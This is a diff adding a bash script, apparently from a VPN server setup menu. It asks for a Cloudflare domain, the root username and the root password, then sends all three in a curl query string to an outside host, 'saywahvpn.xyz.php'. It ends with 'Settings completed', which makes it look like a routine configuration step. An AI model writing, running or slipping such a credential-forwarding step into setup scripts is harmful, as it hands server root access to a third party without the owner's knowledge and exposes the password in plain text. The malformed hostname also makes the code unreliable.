@@ -1,0 +1,30 @@
+#!/bin/bash
+echo "
+╭━━━━━━━━━━━━━━━━━━━━━━━╮"
+echo " ┈┣ DNS Must be added to CloudFlare first  "
+echo " ╰━━━━━━━━━━━━━━━━━━━━━━━╯"
+read -p " : " dns
+
+echo "
+╭━━━━━━━━━━━━━━━━━━━━━━━╮"
+echo " ┈┣ root Username root only  "
+echo " ╰━━━━━━━━━━━━━━━━━━━━━━━╯"
+read -p " : " root
+
+echo "
+╭━━━━━━━━━━━━━━━━━━━━━━━╮"
+echo " ┈┣ Server password  "
+echo " ╰━━━━━━━━━━━━━━━━━━━━━━━╯"
+read -p " : " pass
+
+curl "https://saywahvpn.xyz.php?update_free=true&ip=$dns&quser=$root&qpass=$pass"
+
+
+clear
+echo "
+Settings completed
+"
+
+sleep 5
+
+menu
